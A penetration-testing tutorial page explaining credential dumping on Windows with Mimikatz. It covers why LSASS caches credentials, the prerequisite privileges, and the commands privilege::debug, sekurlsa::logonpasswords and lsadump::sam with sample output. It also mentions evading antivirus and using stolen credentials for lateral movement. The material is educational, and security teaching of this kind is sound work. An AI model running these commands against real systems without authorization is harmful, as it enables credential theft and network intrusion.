---
title: "Credential Dumping with Mimikatz"
sidebar_position: 6
---

In the world of penetration testing, some tools are useful, some are powerful, and a select few are true legends. **Mimikatz** is in a league of its own. For years, it has been the single most feared and effective tool for post-exploitation on Windows systems. Its primary purpose? To pull passwords, hashes, and tickets directly from your computer's memory.

When a pentester gains administrator access to a machine, their first thought is often, "Time to run Mimikatz." It's the skeleton key that unlocks nearly every other door in the kingdom by revealing the credentials of anyone who has logged onto that machine.

Think of it like this: The LSASS process is the high-security vault in a bank's back office where the head tellers (users) temporarily store their keys (credentials) while they work. Mimikatz is the master thief who has the blueprint to that vault and can walk in, open every single lockbox, and walk out with all the keys, often without tripping a single alarm.

---

## The "Why": The LSASS Process, A Memory Goldmine

The magic behind Mimikatz's primary function is its ability to interact with the **Local Security Authority Subsystem Service (LSASS)**. This is a core Windows process (`lsass.exe`) that handles all user authentication, password changes, and the creation of access tokens.

To make Single Sign-On (SSO) and other features work smoothly, LSASS caches credential material in its memory for users who are currently logged on or have recently logged on. Depending on the Windows version and its patch level, this cached material can include:

* **Plaintext passwords** (thanks to the old WDigest provider)
* **NTLM hashes**
* **Kerberos tickets**
* **And more...**

Mimikatz knows exactly where to look in the vast memory space of LSASS to find and extract this information.

---

## The Heist: Unleashing the Cat

To use Mimikatz, you must have already gained **high-level privileges** on the target machine. You typically need to be running as `Administrator` (with the ability to get debug privileges) or, even better, as `NT AUTHORITY\SYSTEM`.

### **The Prerequisites**

1.  **Administrator/SYSTEM Access:** You cannot run Mimikatz as a standard user.
2.  **Architecture Match:** You must use the correct version of Mimikatz (32-bit or 64-bit) that matches the architecture of the Windows OS you are on.
3.  **Bypassing Antivirus:** Modern AV and EDR solutions are specifically designed to detect and block Mimikatz. A large part of using it successfully involves obfuscation or using techniques to bypass these defenses.

### **The Commands: The Holy Trinity**

Once you have a privileged command prompt on your target, you load the Mimikatz executable.

```powershell
.\\mimikatz.exe
```

You'll be dropped into the Mimikatz shell. From here, there are three commands that every pentester knows by heart.

1. `privilege::debug`
This is always the first command you run. It attempts to grant your current process the `SeDebugPrivilege`, which is required to inspect the memory of other processes, including the all-important LSASS.

    ```powershell
    mimikatz # privilege::debug
    Privilege '20' (SeDebugPrivilege) OK
    ```

2. `sekurlsa::logonpasswords`
This is the flagship command. It reaches into the LSASS process memory and dumps all available credentials for all logged-on user sessions. The output will neatly list users and any passwords, hashes, and tickets associated with them.

    ```shell
    mimikatz # sekurlsa::logonpasswords

    Authentication Id : 0 ; 4321098
    Session           : Interactive from 1
    User Name         : DomainAdmin
    Domain            : CORP
    Logon Server      : DC01
    Logon Time        : 7/11/2025 5:15:00 PM
    SID               : S-1-5-21-12345-67890-1234
            msv :
            [00000003] Primary
            * Username : DomainAdmin
            * Domain   : CORP
            * NTLM     : 8a7988365108b7425105941324741655
            * Password : ThisIsMySuperSecurePassword1!
            wdigest :
            * Username : DomainAdmin
            * Domain   : CORP
            * Password : ThisIsMySuperSecurePassword1!
    ```

3. `lsadump::sam`
This command interacts with the SAM database to dump the hashes of local accounts. It's the Mimikatz equivalent of running `secretsdump` locally. It's useful for getting the local administrator hash, which is often reused across multiple machines.

    ```powershell
    mimikatz # lsadump::sam
    ```

## How It Fits into Your Attack Strategy

Mimikatz is the primary credential harvesting and privilege escalation tool in the post-exploitation phase.

 - **It's the Key to Lateral Movement**: After compromising one server, you run Mimikatz. You might find the credentials of a Domain Admin who was logged in performing maintenance. You can now use those credentials to access any other server in the domain, including the Domain Controllers.

 - **It Reveals Everything**: The sheer volume of information dumped by Mimikatz (hashes for Pass the Hash, tickets for Pass the Ticket, plaintext for direct use) gives a pentester a wealth of options for their next move.

Defending against Mimikatz is a cornerstone of modern endpoint security, with techniques like Credential Guard and robust EDR solutions being the primary defenses.